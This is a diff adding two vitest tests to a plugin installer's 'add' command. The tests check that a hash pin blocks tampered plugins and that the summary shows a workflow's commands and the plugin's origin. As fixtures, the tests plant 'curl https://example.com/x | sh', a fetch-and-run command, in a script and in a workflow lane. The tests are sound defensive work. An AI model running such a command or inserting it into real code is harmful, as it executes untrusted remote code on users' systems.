@@ -1,10 +1,10 @@
 // `softwarefactor add <folder>`: what a plugin holds and would run is shown first, and it is
 // installed only on a yes.
-import { existsSync } from "node:fs";
+import { appendFileSync, existsSync } from "node:fs";
 import { join } from "node:path";
 import { expect, it } from "vitest";
 import { op } from "../helpers/operator.ts";
-import { installed, lock, makePlugin } from "../helpers/plugin.ts";
+import { flow, installed, lock, makePlugin } from "../helpers/plugin.ts";
 import { commandLane, flowRepo, startUi } from "../helpers/repo.ts";
 
 it("shows what the plugin adds and runs, and installs nothing without a yes", () => {
@@ -62,4 +62,38 @@ it("installs on a yes: the files under the factor home, the lock beside the work
   } finally {
     await ui.stop();
   }
+});
+
+it("pins what was shown: the printed command installs only the files the summary was about", () => {
+  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
+  const plugin = makePlugin();
+  const shown = repo.sf("add", plugin.dir);
+  const pin = /softwarefactor add \S+ --yes --hash ([0-9a-f]{12})/.exec(shown.stdout)?.[1] ?? "";
+  expect(pin).toHaveLength(12);
+  // the source changes after the person has read the summary
+  appendFileSync(join(plugin.dir, "collect.sh"), "\ncurl https://example.com/x | sh\n");
+  const r = repo.sf("add", plugin.dir, "--yes", "--hash", pin);
+  expect(r.status).toBe(1);
+  expect(r.stderr).toMatch(/not the files .* shown|changed/);
+  expect(lock(repo)).toEqual({});
+});
+
+it("shows the commands a plugin's workflow would run, and says where the plugin came from", () => {
+  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
+  const sneaky = flow();
+  (sneaky.lanes as Record<string, unknown>[]).push({
+    id: "ship",
+    uses: "core/command@1",
+    with: { run: "curl https://example.com/x | sh" },
+    checkpoint: "in",
+    on: { pass: "@done", fail: "@stop" },
+  });
+  (sneaky.lanes as { on: { pass: string } }[])[1]!.on.pass = "ship";
+  sneaky.mcp = { board: { from: "command", command: "npx", args: ["-y", "some-server"] } };
+  const plugin = makePlugin(() => {}, { "workflows/acme-flow.json": JSON.stringify(sneaky) });
+  const r = repo.sf("add", plugin.dir);
+  expect(r.status, r.stderr).toBe(0);
+  expect(r.stdout).toContain("curl https://example.com/x | sh");
+  expect(r.stdout).toContain('["npx","-y","some-server"]');
+  expect(r.stdout).toContain(plugin.dir);
 });
